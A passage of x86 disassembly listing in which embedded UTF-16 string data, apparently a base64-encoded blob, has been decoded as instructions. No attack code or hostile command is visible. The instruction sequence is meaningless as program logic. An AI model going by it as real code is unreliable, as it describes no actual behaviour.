  40a18c:	73 00                	jae    0x40a18e
  40a18e:	72 00                	jb     0x40a190
  40a190:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a194:	69 00 37 00 2f 00    	imul   $0x2f0037,(%eax),%eax
  40a19a:	50                   	push   %eax
  40a19b:	00 48 00             	add    %cl,0x0(%eax)
  40a19e:	30 00                	xor    %al,(%eax)
  40a1a0:	2b 00                	sub    (%eax),%eax
  40a1a2:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40a1a6:	38 00                	cmp    %al,(%eax)
  40a1a8:	57                   	push   %edi
  40a1a9:	00 66 00             	add    %ah,0x0(%esi)
  40a1ac:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a1b0:	4a                   	dec    %edx
  40a1b1:	00 55 00             	add    %dl,0x0(%ebp)
  40a1b4:	70 00                	jo     0x40a1b6
  40a1b6:	76 00                	jbe    0x40a1b8
  40a1b8:	59                   	pop    %ecx
  40a1b9:	00 2f                	add    %ch,(%edi)
  40a1bb:	00 59 00             	add    %bl,0x0(%ecx)
  40a1be:	58                   	pop    %eax
  40a1bf:	00 66 00             	add    %ah,0x0(%esi)
  40a1c2:	37                   	aaa
  40a1c3:	00 31                	add    %dh,(%ecx)
  40a1c5:	00 67 00             	add    %ah,0x0(%edi)
  40a1c8:	38 00                	cmp    %al,(%eax)
  40a1ca:	79 00                	jns    0x40a1cc
  40a1cc:	6a 00                	push   $0x0
  40a1ce:	35 00 62 00 6c       	xor    $0x6c006200,%eax
  40a1d3:	00 31                	add    %dh,(%ecx)
  40a1d5:	00 58 00             	add    %bl,0x0(%eax)
  40a1d8:	54                   	push   %esp
  40a1d9:	00 75 00             	add    %dh,0x0(%ebp)
  40a1dc:	45                   	inc    %ebp
  40a1dd:	00 45 00             	add    %al,0x0(%ebp)
  40a1e0:	63 00                	arpl   %eax,(%eax)
  40a1e2:	6d                   	insl   (%dx),%es:(%edi)
  40a1e3:	00 47 00             	add    %al,0x0(%edi)
  40a1e6:	76 00                	jbe    0x40a1e8
  40a1e8:	73 00                	jae    0x40a1ea
  40a1ea:	5a                   	pop    %edx
  40a1eb:	00 58 00             	add    %bl,0x0(%eax)
  40a1ee:	2b 00                	sub    (%eax),%eax
  40a1f0:	6a 00                	push   $0x0
  40a1f2:	6c                   	insb   (%dx),%es:(%edi)
  40a1f3:	00 66 00             	add    %ah,0x0(%esi)
  40a1f6:	62 00                	bound  %eax,(%eax)
  40a1f8:	59                   	pop    %ecx
  40a1f9:	00 7a 00             	add    %bh,0x0(%edx)
  40a1fc:	63 00                	arpl   %eax,(%eax)
  40a1fe:	47                   	inc    %edi
  40a1ff:	00 2b                	add    %ch,(%ebx)
  40a201:	00 67 00             	add    %ah,0x0(%edi)
  40a204:	48                   	dec    %eax
  40a205:	00 47 00             	add    %al,0x0(%edi)
  40a208:	41                   	inc    %ecx
  40a209:	00 4b 00             	add    %cl,0x0(%ebx)
  40a20c:	35 00 39 00 57       	xor    $0x57003900,%eax
  40a211:	00 6d 00             	add    %ch,0x0(%ebp)
  40a214:	6a 00                	push   $0x0
  40a216:	34 00                	xor    $0x0,%al
  40a218:	4a                   	dec    %edx
  40a219:	00 4e 00             	add    %cl,0x0(%esi)
  40a21c:	36 00 44 00 31       	add    %al,%ss:0x31(%eax,%eax,1)
  40a221:	00 38                	add    %bh,(%eax)
  40a223:	00 59 00             	add    %bl,0x0(%ecx)
  40a226:	42                   	inc    %edx
  40a227:	00 45 00             	add    %al,0x0(%ebp)
  40a22a:	51                   	push   %ecx
  40a22b:	00 36                	add    %dh,(%esi)
  40a22d:	00 42 00             	add    %al,0x0(%edx)
  40a230:	32 00                	xor    (%eax),%al
  40a232:	62 00                	bound  %eax,(%eax)
  40a234:	62 00                	bound  %eax,(%eax)
  40a236:	53                   	push   %ebx
  40a237:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  40a23b:	00 4e 00             	add    %cl,0x0(%esi)
  40a23e:	48                   	dec    %eax
  40a23f:	00 75 00             	add    %dh,0x0(%ebp)
  40a242:	71 00                	jno    0x40a244
  40a244:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a247:	00 6f 00             	add    %ch,0x0(%edi)
  40a24a:	59                   	pop    %ecx
  40a24b:	00 31                	add    %dh,(%ecx)
  40a24d:	00 50 00             	add    %dl,0x0(%eax)
  40a250:	42                   	inc    %edx
  40a251:	00 4a 00             	add    %cl,0x0(%edx)
  40a254:	2b 00                	sub    (%eax),%eax
  40a256:	30 00                	xor    %al,(%eax)
  40a258:	54                   	push   %esp
  40a259:	00 59 00             	add    %bl,0x0(%ecx)
  40a25c:	32 00                	xor    (%eax),%al
  40a25e:	53                   	push   %ebx
  40a25f:	00 42 00             	add    %al,0x0(%edx)
  40a262:	35 00 44 00 56       	xor    $0x56004400,%eax
  40a267:	00 68 00             	add    %ch,0x0(%eax)
  40a26a:	76 00                	jbe    0x40a26c
  40a26c:	63 00                	arpl   %eax,(%eax)
  40a26e:	43                   	inc    %ebx
  40a26f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a272:	5a                   	pop    %edx
  40a273:	00 77 00             	add    %dh,0x0(%edi)
  40a276:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a27a:	34 00                	xor    $0x0,%al
  40a27c:	31 00                	xor    %eax,(%eax)
  40a27e:	2b 00                	sub    (%eax),%eax
  40a280:	72 00                	jb     0x40a282
  40a282:	6f                   	outsl  %ds:(%esi),(%dx)
  40a283:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40a287:	00 6f 00             	add    %ch,0x0(%edi)
  40a28a:	4f                   	dec    %edi
  40a28b:	00 49 00             	add    %cl,0x0(%ecx)
  40a28e:	63 00                	arpl   %eax,(%eax)
  40a290:	30 00                	xor    %al,(%eax)
  40a292:	47                   	inc    %edi
  40a293:	00 63 00             	add    %ah,0x0(%ebx)
  40a296:	30 00                	xor    %al,(%eax)
  40a298:	2b 00                	sub    (%eax),%eax
  40a29a:	2f                   	das
  40a29b:	00 69 00             	add    %ch,0x0(%ecx)
  40a29e:	4d                   	dec    %ebp
  40a29f:	00 50 00             	add    %dl,0x0(%eax)
  40a2a2:	68 00 4c 00 73       	push   $0x73004c00
  40a2a7:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40a2ab:	00 78 00             	add    %bh,0x0(%eax)
  40a2ae:	70 00                	jo     0x40a2b0
  40a2b0:	76 00                	jbe    0x40a2b2
  40a2b2:	5a                   	pop    %edx
  40a2b3:	00 70 00             	add    %dh,0x0(%eax)
  40a2b6:	37                   	aaa
  40a2b7:	00 50 00             	add    %dl,0x0(%eax)
  40a2ba:	63 00                	arpl   %eax,(%eax)
  40a2bc:	4d                   	dec    %ebp
  40a2bd:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a2c1:	00 53 00             	add    %dl,0x0(%ebx)
  40a2c4:	5a                   	pop    %edx
  40a2c5:	00 52 00             	add    %dl,0x0(%edx)
  40a2c8:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a2cc:	4b                   	dec    %ebx
  40a2cd:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a2d1:	00 6f 00             	add    %ch,0x0(%edi)
  40a2d4:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a2d7:	00 7a 00             	add    %bh,0x0(%edx)
  40a2da:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40a2de:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2df:	00 66 00             	add    %ah,0x0(%esi)
  40a2e2:	41                   	inc    %ecx
  40a2e3:	00 39                	add    %bh,(%ecx)
  40a2e5:	00 45 00             	add    %al,0x0(%ebp)
  40a2e8:	35 00 75 00 48       	xor    $0x48007500,%eax
  40a2ed:	00 71 00             	add    %dh,0x0(%ecx)
  40a2f0:	54                   	push   %esp
  40a2f1:	00 49 00             	add    %cl,0x0(%ecx)
  40a2f4:	55                   	push   %ebp
  40a2f5:	00 56 00             	add    %dl,0x0(%esi)
  40a2f8:	4d                   	dec    %ebp
  40a2f9:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40a2fd:	00 66 00             	add    %ah,0x0(%esi)
  40a300:	59                   	pop    %ecx
  40a301:	00 2b                	add    %ch,(%ebx)
  40a303:	00 7a 00             	add    %bh,0x0(%edx)
  40a306:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40a30a:	57                   	push   %edi
  40a30b:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40a30f:	00 38                	add    %bh,(%eax)
  40a311:	00 4b 00             	add    %cl,0x0(%ebx)
  40a314:	45                   	inc    %ebp
  40a315:	00 4a 00             	add    %cl,0x0(%edx)
  40a318:	63 00                	arpl   %eax,(%eax)
  40a31a:	38 00                	cmp    %al,(%eax)
  40a31c:	35 00 79 00 6a       	xor    $0x6a007900,%eax
  40a321:	00 4b 00             	add    %cl,0x0(%ebx)
  40a324:	72 00                	jb     0x40a326
  40a326:	36 00 39             	add    %bh,%ss:(%ecx)
  40a329:	00 4d 00             	add    %cl,0x0(%ebp)
  40a32c:	57                   	push   %edi
  40a32d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a330:	36 00 31             	add    %dh,%ss:(%ecx)
  40a333:	00 56 00             	add    %dl,0x0(%esi)
  40a336:	4c                   	dec    %esp
  40a337:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a33a:	61                   	popa
  40a33b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a33e:	62 00                	bound  %eax,(%eax)
  40a340:	48                   	dec    %eax
  40a341:	00 4e 00             	add    %cl,0x0(%esi)
  40a344:	6f                   	outsl  %ds:(%esi),(%dx)
  40a345:	00 4d 00             	add    %cl,0x0(%ebp)
  40a348:	38 00                	cmp    %al,(%eax)
  40a34a:	2b 00                	sub    (%eax),%eax
  40a34c:	71 00                	jno    0x40a34e
  40a34e:	4e                   	dec    %esi
  40a34f:	00 76 00             	add    %dh,0x0(%esi)
  40a352:	7a 00                	jp     0x40a354
  40a354:	35 00 67 00 75       	xor    $0x75006700,%eax
  40a359:	00 47 00             	add    %al,0x0(%edi)
  40a35c:	62 00                	bound  %eax,(%eax)
  40a35e:	58                   	pop    %eax
  40a35f:	00 53 00             	add    %dl,0x0(%ebx)
  40a362:	34 00                	xor    $0x0,%al
  40a364:	4f                   	dec    %edi
  40a365:	00 73 00             	add    %dh,0x0(%ebx)
  40a368:	31 00                	xor    %eax,(%eax)
  40a36a:	55                   	push   %ebp
  40a36b:	00 37                	add    %dh,(%edi)
  40a36d:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  40a371:	00 38                	add    %bh,(%eax)
  40a373:	00 57 00             	add    %dl,0x0(%edi)
  40a376:	7a 00                	jp     0x40a378
  40a378:	4c                   	dec    %esp
  40a379:	00 79 00             	add    %bh,0x0(%ecx)
  40a37c:	32 00                	xor    (%eax),%al
  40a37e:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40a382:	6c                   	insb   (%dx),%es:(%edi)
  40a383:	00 2b                	add    %ch,(%ebx)
  40a385:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40a389:	00 78 00             	add    %bh,0x0(%eax)
  40a38c:	67 00 54 00          	add    %dl,0x0(%si)
  40a390:	47                   	inc    %edi
  40a391:	00 31                	add    %dh,(%ecx)
  40a393:	00 66 00             	add    %ah,0x0(%esi)
  40a396:	4c                   	dec    %esp
  40a397:	00 69 00             	add    %ch,0x0(%ecx)
  40a39a:	48                   	dec    %eax
  40a39b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a39e:	38 00                	cmp    %al,(%eax)
  40a3a0:	42                   	inc    %edx
  40a3a1:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a3a5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3a8:	50                   	push   %eax
  40a3a9:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a3ad:	00 70 00             	add    %dh,0x0(%eax)
  40a3b0:	79 00                	jns    0x40a3b2
  40a3b2:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40a3b6:	50                   	push   %eax
  40a3b7:	00 65 00             	add    %ah,0x0(%ebp)
  40a3ba:	30 00                	xor    %al,(%eax)
  40a3bc:	69 00 47 00 31 00    	imul   $0x310047,(%eax),%eax
  40a3c2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3c3:	00 32                	add    %dh,(%edx)
  40a3c5:	00 57 00             	add    %dl,0x0(%edi)
  40a3c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3c9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3cc:	39 00                	cmp    %eax,(%eax)
  40a3ce:	35 00 42 00 47       	xor    $0x47004200,%eax
  40a3d3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3d6:	63 00                	arpl   %eax,(%eax)
  40a3d8:	71 00                	jno    0x40a3da
  40a3da:	39 00                	cmp    %eax,(%eax)
  40a3dc:	5a                   	pop    %edx
  40a3dd:	00 49 00             	add    %cl,0x0(%ecx)
  40a3e0:	55                   	push   %ebp
  40a3e1:	00 56 00             	add    %dl,0x0(%esi)
  40a3e4:	57                   	push   %edi
  40a3e5:	00 42 00             	add    %al,0x0(%edx)
  40a3e8:	47                   	inc    %edi
  40a3e9:	00 50 00             	add    %dl,0x0(%eax)
  40a3ec:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a3ef:	00 66 00             	add    %ah,0x0(%esi)
  40a3f2:	48                   	dec    %eax
  40a3f3:	00 59 00             	add    %bl,0x0(%ecx)
  40a3f6:	48                   	dec    %eax
  40a3f7:	00 43 00             	add    %al,0x0(%ebx)
  40a3fa:	32 00                	xor    (%eax),%al
  40a3fc:	6b 00 47             	imul   $0x47,(%eax),%eax
  40a3ff:	00 6d 00             	add    %ch,0x0(%ebp)
  40a402:	78 00                	js     0x40a404
  40a404:	79 00                	jns    0x40a406
  40a406:	52                   	push   %edx
  40a407:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40a40b:	00 37                	add    %dh,(%edi)
  40a40d:	00 36                	add    %dh,(%esi)
  40a40f:	00 59 00             	add    %bl,0x0(%ecx)
  40a412:	59                   	pop    %ecx
  40a413:	00 71 00             	add    %dh,0x0(%ecx)
  40a416:	4c                   	dec    %esp
  40a417:	00 56 00             	add    %dl,0x0(%esi)
  40a41a:	76 00                	jbe    0x40a41c
  40a41c:	61                   	popa
  40a41d:	00 66 00             	add    %ah,0x0(%esi)
  40a420:	2f                   	das
  40a421:	00 6b 00             	add    %ch,0x0(%ebx)
  40a424:	37                   	aaa
  40a425:	00 78 00             	add    %bh,0x0(%eax)
  40a428:	77 00                	ja     0x40a42a
  40a42a:	43                   	inc    %ebx
  40a42b:	00 6e 00             	add    %ch,0x0(%esi)
  40a42e:	75 00                	jne    0x40a430
  40a430:	69 00 6f 00 37 00    	imul   $0x37006f,(%eax),%eax
  40a436:	6c                   	insb   (%dx),%es:(%edi)
  40a437:	00 62 00             	add    %ah,0x0(%edx)
  40a43a:	56                   	push   %esi
  40a43b:	00 36                	add    %dh,(%esi)
  40a43d:	00 30                	add    %dh,(%eax)
  40a43f:	00 38                	add    %bh,(%eax)
  40a441:	00 45 00             	add    %al,0x0(%ebp)
  40a444:	75 00                	jne    0x40a446
  40a446:	47                   	inc    %edi
  40a447:	00 6b 00             	add    %ch,0x0(%ebx)
  40a44a:	6a 00                	push   $0x0
  40a44c:	68 00 45 00 53       	push   $0x53004500
  40a451:	00 56 00             	add    %dl,0x0(%esi)
  40a454:	48                   	dec    %eax
  40a455:	00 78 00             	add    %bh,0x0(%eax)
  40a458:	68 00 69 00 75       	push   $0x75006900
  40a45d:	00 51 00             	add    %dl,0x0(%ecx)
  40a460:	43                   	inc    %ebx
  40a461:	00 50 00             	add    %dl,0x0(%eax)
  40a464:	61                   	popa
  40a465:	00 32                	add    %dh,(%edx)
  40a467:	00 7a 00             	add    %bh,0x0(%edx)
  40a46a:	62 00                	bound  %eax,(%eax)
  40a46c:	46                   	inc    %esi
  40a46d:	00 6f 00             	add    %ch,0x0(%edi)
  40a470:	6b 00 56             	imul   $0x56,(%eax),%eax
  40a473:	00 57 00             	add    %dl,0x0(%edi)
  40a476:	42                   	inc    %edx
  40a477:	00 65 00             	add    %ah,0x0(%ebp)
  40a47a:	54                   	push   %esp
  40a47b:	00 45 00             	add    %al,0x0(%ebp)
  40a47e:	63 00                	arpl   %eax,(%eax)
  40a480:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a483:	00 57 00             	add    %dl,0x0(%edi)
  40a486:	7a 00                	jp     0x40a488
  40a488:	30 00                	xor    %al,(%eax)
  40a48a:	38 00                	cmp    %al,(%eax)
  40a48c:	55                   	push   %ebp
  40a48d:	00 32                	add    %dh,(%edx)
  40a48f:	00 6f 00             	add    %ch,0x0(%edi)
  40a492:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40a498:	6e                   	outsb  %ds:(%esi),(%dx)
  40a499:	00 52 00             	add    %dl,0x0(%edx)
  40a49c:	7a 00                	jp     0x40a49e
  40a49e:	71 00                	jno    0x40a4a0
  40a4a0:	71 00                	jno    0x40a4a2
  40a4a2:	42                   	inc    %edx
  40a4a3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4a6:	38 00                	cmp    %al,(%eax)
  40a4a8:	75 00                	jne    0x40a4aa
  40a4aa:	2f                   	das
  40a4ab:	00 5a 00             	add    %bl,0x0(%edx)
  40a4ae:	4a                   	dec    %edx
  40a4af:	00 63 00             	add    %ah,0x0(%ebx)
  40a4b2:	75 00                	jne    0x40a4b4
  40a4b4:	66 00 2f             	data16 add %ch,(%edi)
  40a4b7:	00 78 00             	add    %bh,0x0(%eax)
  40a4ba:	6c                   	insb   (%dx),%es:(%edi)
  40a4bb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4be:	2f                   	das
  40a4bf:	00 61 00             	add    %ah,0x0(%ecx)
  40a4c2:	77 00                	ja     0x40a4c4
  40a4c4:	43                   	inc    %ebx
  40a4c5:	00 6f 00             	add    %ch,0x0(%edi)
  40a4c8:	7a 00                	jp     0x40a4ca
  40a4ca:	74 00                	je     0x40a4cc
  40a4cc:	74 00                	je     0x40a4ce
  40a4ce:	4c                   	dec    %esp
  40a4cf:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4d2:	4c                   	dec    %esp
  40a4d3:	00 37                	add    %dh,(%edi)
  40a4d5:	00 41 00             	add    %al,0x0(%ecx)
  40a4d8:	75 00                	jne    0x40a4da
  40a4da:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40a4de:	43                   	inc    %ebx
  40a4df:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40a4e3:	00 35 00 43 00 36    	add    %dh,0x36004300
  40a4e9:	00 6a 00             	add    %ch,0x0(%edx)
  40a4ec:	54                   	push   %esp
  40a4ed:	00 55 00             	add    %dl,0x0(%ebp)
  40a4f0:	79 00                	jns    0x40a4f2
  40a4f2:	53                   	push   %ebx
  40a4f3:	00 36                	add    %dh,(%esi)
  40a4f5:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40a4f9:	00 77 00             	add    %dh,0x0(%edi)
  40a4fc:	66 00 38             	data16 add %bh,(%eax)
  40a4ff:	00 6f 00             	add    %ch,0x0(%edi)
  40a502:	59                   	pop    %ecx
  40a503:	00 38                	add    %bh,(%eax)
  40a505:	00 56 00             	add    %dl,0x0(%esi)
  40a508:	32 00                	xor    (%eax),%al
  40a50a:	54                   	push   %esp
  40a50b:	00 58 00             	add    %bl,0x0(%eax)
  40a50e:	39 00                	cmp    %eax,(%eax)
  40a510:	71 00                	jno    0x40a512
  40a512:	49                   	dec    %ecx
  40a513:	00 65 00             	add    %ah,0x0(%ebp)
  40a516:	57                   	push   %edi
  40a517:	00 50 00             	add    %dl,0x0(%eax)
  40a51a:	41                   	inc    %ecx
  40a51b:	00 73 00             	add    %dh,0x0(%ebx)
  40a51e:	66 00 6c 00 6a       	data16 add %ch,0x6a(%eax,%eax,1)
  40a523:	00 4d 00             	add    %cl,0x0(%ebp)
  40a526:	6c                   	insb   (%dx),%es:(%edi)
  40a527:	00 48 00             	add    %cl,0x0(%eax)
  40a52a:	47                   	inc    %edi
  40a52b:	00 2f                	add    %ch,(%edi)
  40a52d:	00 67 00             	add    %ah,0x0(%edi)
  40a530:	76 00                	jbe    0x40a532
  40a532:	7a 00                	jp     0x40a534
  40a534:	43                   	inc    %ebx
  40a535:	00 49 00             	add    %cl,0x0(%ecx)
  40a538:	46                   	inc    %esi
  40a539:	00 46 00             	add    %al,0x0(%esi)
  40a53c:	66 00 44 00 54       	data16 add %al,0x54(%eax,%eax,1)
  40a541:	00 65 00             	add    %ah,0x0(%ebp)
  40a544:	50                   	push   %eax
  40a545:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a548:	4c                   	dec    %esp
  40a549:	00 69 00             	add    %ch,0x0(%ecx)
  40a54c:	77 00                	ja     0x40a54e
  40a54e:	37                   	aaa
  40a54f:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40a553:	00 69 00             	add    %ch,0x0(%ecx)
  40a556:	58                   	pop    %eax
  40a557:	00 56 00             	add    %dl,0x0(%esi)
  40a55a:	37                   	aaa
  40a55b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a55e:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40a562:	6e                   	outsb  %ds:(%esi),(%dx)
  40a563:	00 62 00             	add    %ah,0x0(%edx)
  40a566:	30 00                	xor    %al,(%eax)
  40a568:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40a56c:	49                   	dec    %ecx
  40a56d:	00 75 00             	add    %dh,0x0(%ebp)
  40a570:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a574:	30 00                	xor    %al,(%eax)
  40a576:	55                   	push   %ebp
  40a577:	00 58 00             	add    %bl,0x0(%eax)
  40a57a:	79 00                	jns    0x40a57c
  40a57c:	62 00                	bound  %eax,(%eax)
  40a57e:	6a 00                	push   $0x0
  40a580:	74 00                	je     0x40a582
  40a582:	61                   	popa
  40a583:	00 55 00             	add    %dl,0x0(%ebp)
  40a586:	52                   	push   %edx
  40a587:	00 70 00             	add    %dh,0x0(%eax)
  40a58a:	69 00 56 00 2b 00    	imul   $0x2b0056,(%eax),%eax
  40a590:	72 00                	jb     0x40a592
  40a592:	4e                   	dec    %esi
  40a593:	00 77 00             	add    %dh,0x0(%edi)
  40a596:	4c                   	dec    %esp
  40a597:	00 36                	add    %dh,(%esi)
  40a599:	00 4e 00             	add    %cl,0x0(%esi)
  40a59c:	4d                   	dec    %ebp
  40a59d:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a5a1:	00 43 00             	add    %al,0x0(%ebx)
  40a5a4:	2f                   	das
  40a5a5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5a8:	45                   	inc    %ebp
  40a5a9:	00 2f                	add    %ch,(%edi)
  40a5ab:	00 66 00             	add    %ah,0x0(%esi)
  40a5ae:	4b                   	dec    %ebx
  40a5af:	00 46 00             	add    %al,0x0(%esi)
  40a5b2:	4e                   	dec    %esi
  40a5b3:	00 76 00             	add    %dh,0x0(%esi)
  40a5b6:	5a                   	pop    %edx
  40a5b7:	00 33                	add    %dh,(%ebx)
  40a5b9:	00 30                	add    %dh,(%eax)
  40a5bb:	00 2f                	add    %ch,(%edi)
  40a5bd:	00 71 00             	add    %dh,0x0(%ecx)
  40a5c0:	76 00                	jbe    0x40a5c2
  40a5c2:	4d                   	dec    %ebp
  40a5c3:	00 6e 00             	add    %ch,0x0(%esi)
  40a5c6:	4a                   	dec    %edx
  40a5c7:	00 66 00             	add    %ah,0x0(%esi)
  40a5ca:	6c                   	insb   (%dx),%es:(%edi)
  40a5cb:	00 65 00             	add    %ah,0x0(%ebp)
  40a5ce:	30 00                	xor    %al,(%eax)
  40a5d0:	44                   	inc    %esp
  40a5d1:	00 2f                	add    %ch,(%edi)
  40a5d3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5d6:	6c                   	insb   (%dx),%es:(%edi)
  40a5d7:	00 73 00             	add    %dh,0x0(%ebx)
  40a5da:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5db:	00 72 00             	add    %dh,0x0(%edx)
  40a5de:	4e                   	dec    %esi
  40a5df:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40a5e3:	00 37                	add    %dh,(%edi)
  40a5e5:	00 50 00             	add    %dl,0x0(%eax)
  40a5e8:	71 00                	jno    0x40a5ea
  40a5ea:	58                   	pop    %eax
  40a5eb:	00 35 00 36 00 38    	add    %dh,0x38003600
  40a5f1:	00 58 00             	add    %bl,0x0(%eax)
  40a5f4:	67 00 39             	add    %bh,(%bx,%di)
  40a5f7:	00 41 00             	add    %al,0x0(%ecx)
  40a5fa:	36 00 44 00 4b       	add    %al,%ss:0x4b(%eax,%eax,1)
  40a5ff:	00 37                	add    %dh,(%edi)
  40a601:	00 69 00             	add    %ch,0x0(%ecx)
  40a604:	42                   	inc    %edx
  40a605:	00 33                	add    %dh,(%ebx)
  40a607:	00 56 00             	add    %dl,0x0(%esi)
  40a60a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a60b:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  40a60f:	00 72 00             	add    %dh,0x0(%edx)
  40a612:	4e                   	dec    %esi
  40a613:	00 46 00             	add    %al,0x0(%esi)
  40a616:	32 00                	xor    (%eax),%al
  40a618:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40a61c:	42                   	inc    %edx
  40a61d:	00 48 00             	add    %cl,0x0(%eax)
  40a620:	4d                   	dec    %ebp
  40a621:	00 55 00             	add    %dl,0x0(%ebp)
  40a624:	47                   	inc    %edi
  40a625:	00 6d 00             	add    %ch,0x0(%ebp)
  40a628:	6c                   	insb   (%dx),%es:(%edi)
  40a629:	00 75 00             	add    %dh,0x0(%ebp)
  40a62c:	39 00                	cmp    %eax,(%eax)
  40a62e:	43                   	inc    %ebx
  40a62f:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  40a633:	00 75 00             	add    %dh,0x0(%ebp)
  40a636:	70 00                	jo     0x40a638
  40a638:	2f                   	das
  40a639:	00 68 00             	add    %ch,0x0(%eax)
  40a63c:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a640:	50                   	push   %eax
  40a641:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40a645:	00 46 00             	add    %al,0x0(%esi)
  40a648:	63 00                	arpl   %eax,(%eax)
  40a64a:	59                   	pop    %ecx
  40a64b:	00 42 00             	add    %al,0x0(%edx)
  40a64e:	59                   	pop    %ecx
  40a64f:	00 47 00             	add    %al,0x0(%edi)
  40a652:	52                   	push   %edx
  40a653:	00 6e 00             	add    %ch,0x0(%esi)
  40a656:	44                   	inc    %esp
  40a657:	00 30                	add    %dh,(%eax)
  40a659:	00 2f                	add    %ch,(%edi)
  40a65b:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40a65f:	00 5a 00             	add    %bl,0x0(%edx)
  40a662:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a666:	6e                   	outsb  %ds:(%esi),(%dx)
  40a667:	00 6f 00             	add    %ch,0x0(%edi)
  40a66a:	31 00                	xor    %eax,(%eax)
  40a66c:	47                   	inc    %edi
  40a66d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a670:	5a                   	pop    %edx
  40a671:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40a675:	00 52 00             	add    %dl,0x0(%edx)
  40a678:	50                   	push   %eax
  40a679:	00 75 00             	add    %dh,0x0(%ebp)
  40a67c:	59                   	pop    %ecx
  40a67d:	00 61 00             	add    %ah,0x0(%ecx)
  40a680:	34 00                	xor    $0x0,%al
  40a682:	73 00                	jae    0x40a684
  40a684:	44                   	inc    %esp
  40a685:	00 52 00             	add    %dl,0x0(%edx)
  40a688:	62 00                	bound  %eax,(%eax)
  40a68a:	77 00                	ja     0x40a68c
  40a68c:	44                   	inc    %esp
  40a68d:	00 69 00             	add    %ch,0x0(%ecx)
  40a690:	4d                   	dec    %ebp
  40a691:	00 33                	add    %dh,(%ebx)
  40a693:	00 59 00             	add    %bl,0x0(%ecx)
  40a696:	52                   	push   %edx
  40a697:	00 73 00             	add    %dh,0x0(%ebx)
  40a69a:	32 00                	xor    (%eax),%al
  40a69c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a69d:	00 58 00             	add    %bl,0x0(%eax)
  40a6a0:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a6a4:	44                   	inc    %esp
  40a6a5:	00 72 00             	add    %dh,0x0(%edx)
  40a6a8:	44                   	inc    %esp
  40a6a9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6ac:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a6b0:	30 00                	xor    %al,(%eax)
  40a6b2:	66 00 33             	data16 add %dh,(%ebx)
  40a6b5:	00 5a 00             	add    %bl,0x0(%edx)
  40a6b8:	46                   	inc    %esi
  40a6b9:	00 49 00             	add    %cl,0x0(%ecx)
  40a6bc:	37                   	aaa
  40a6bd:	00 32                	add    %dh,(%edx)
  40a6bf:	00 37                	add    %dh,(%edi)
  40a6c1:	00 30                	add    %dh,(%eax)
  40a6c3:	00 39                	add    %bh,(%ecx)
  40a6c5:	00 37                	add    %dh,(%edi)
  40a6c7:	00 56 00             	add    %dl,0x0(%esi)
  40a6ca:	56                   	push   %esi
  40a6cb:	00 66 00             	add    %ah,0x0(%esi)
  40a6ce:	4f                   	dec    %edi
